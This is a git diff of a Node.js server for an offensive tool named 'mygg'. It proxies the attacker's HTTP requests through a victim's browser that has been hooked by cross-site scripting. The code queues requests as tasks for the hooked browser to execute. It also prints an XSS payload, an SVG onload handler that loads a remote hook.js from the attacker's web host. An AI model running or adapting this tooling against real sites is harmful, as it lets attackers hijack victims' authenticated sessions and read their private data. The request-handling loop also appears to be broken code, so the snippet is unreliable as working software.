@@ -3,7 +3,7 @@ const http = require('http');
 const fs = require('fs');
 
 /* 
-### Config
+### Config.
 */
 
 const config = {
@@ -17,15 +17,18 @@ const config = {
 }
 
 /* 
-task_pending structure:
-var tasks_pending = [{"id": 1, "method": "GET", "url": "/secret.html", "head": {"Token": "key"}, "body": null},
-                     {"id": 2, "method": "POST", "url": "/secret2.html", "head": {"Content-Type": "application/json"}, "body": '{"test":"asdf"}'}]
-*/
+task_pending test
 var tasks_pending = [{"id": 1, "method": "GET", "url": "/secret.html", "head": {"Token": "key"}, "body": null},
                      {"id": 2, "method": "GET", "url": "/secret2.html", "head": {"Token": "key"}, "body": null},
                      {"id": 3, "method": "POST", "url": "/secret2.html", "head": {"Content-Type": "application/json"}, "body": '{"test":"asdf"}'},
                      {"id": 4, "method": "POST", "url": "/secret2.html", "head": {"Content-Type": "application/x-www-form-urlencoded"}, "body": "test=asdf&qwer=123"},
                     ]
+*/
+var tasks_pending = []
+/* 
+task_completed test
+var tasks_pending = [{"id": 1, "head": {"Token": "key"}, "body": null},
+*/
 var tasks_completed = [];
 
 
@@ -38,31 +41,36 @@ const proxy_options = {
     cert: config.cert
 };
 
-const proxy_server = http.createServer(proxy_options, function (req, res) {
-    res.writeHead(405, {'Content-Type': 'text/plain'})
-    res.end('Method not allowed')
-    
-})
+var task_counter = 10;
 
-proxy_server.on('connect', function (req, client_socket, head) {
-    console.log(client_socket.remoteAddress, client_socket.remotePort, req.method, req.url, req.headers)
-    client_socket.write([
-      'HTTP/1.1 200 Connection Established',
-      'Proxy-agent: Node-VPN',
-    ].join('\r\n'))
-    client_socket.end('\r\n\r\n')
-});
+http.createServer(function (req, res) {
+    //console.log("Incomming request")
+    //console.log(req.headers)
+    //console.log(req.url)
+    //console.log(req.body)
 
-const listener = proxy_server.listen(config.proxy_port, function (err) {
+    /* Add new task */
+    var id = task_counter;
+    var new_task = {"id": task_counter++, "method": req.method, "url": req.url, "head": req.headers, "body": req.body}
+    tasks_pending.push(new_task);
+    console.log(tasks_pending)
+    /* Waiting for the task to be polled and executed by the hooked browser */
+    while (1) {
+        tasks_completed.forEach(function(obj) {
+            if (obj.id == id) {
+                res.writeHead(200, obj.headers);
+                res.end(obj.body);
+            }
+        });
+    }   
+
+}).listen(config.proxy_port, function (err) {
     if (err) {
-      return console.error(err)
+        return console.error(err)
     }
-    const info = listener.address()
-    console.log(`[+] Proxy server is listening on address ${info.address} port ${info.port}`)
-})
-    
-
-
+    var info = this.address()
+    console.log(`[+] mygg server is listening on address ${info.address} port ${info.port}`)
+});
 
 
 /* 
@@ -139,4 +147,44 @@ https.createServer(https_options, function (req, res) {
 var hook = '<svg/onload="x=document.createElement(\'script\');'
 var hook = hook + 'x.src="//' + config.web_host + '/hook.js";document.head.appendChild(x);">'
 console.log("[+] Payload:\r\n" + hook + "\r\n")
+
+
+
+//const proxy_server = http.createServer(proxy_options, function (req, res) {
+    //res.writeHead(405, {'Content-Type': 'text/plain'})
+    //res.end('Method not allowed')
+    
+//})
+
+/*
+proxy_server.on('connect', function (req, client_socket, head) {
+    console.log(client_socket.remoteAddress, client_socket.remotePort, req.method, req.url, req.headers)
+    client_socket.write([
+      'HTTP/1.1 200 Connection Established',
+      'Proxy-agent: Node-VPN',
+    ].join('\r\n'))
+    client_socket.end('\r\n\r\n')
+
+    var buf = ''
+    client_socket.on('data', function ( chunk ) {
+        buf += chunk
+    });
+
+    client_socket.on('end', function () {
+        console.log(buf)
+        client_socket.end();
+    });
+});
+*/
+
+/*
+const listener = proxy_server.listen(config.proxy_port, function (err) {
+    if (err) {
+      return console.error(err)
+    }
+    const info = listener.address()
+    console.log(`[+] Proxy server is listening on address ${info.address} port ${info.port}`)
+})
+  */  
+
 
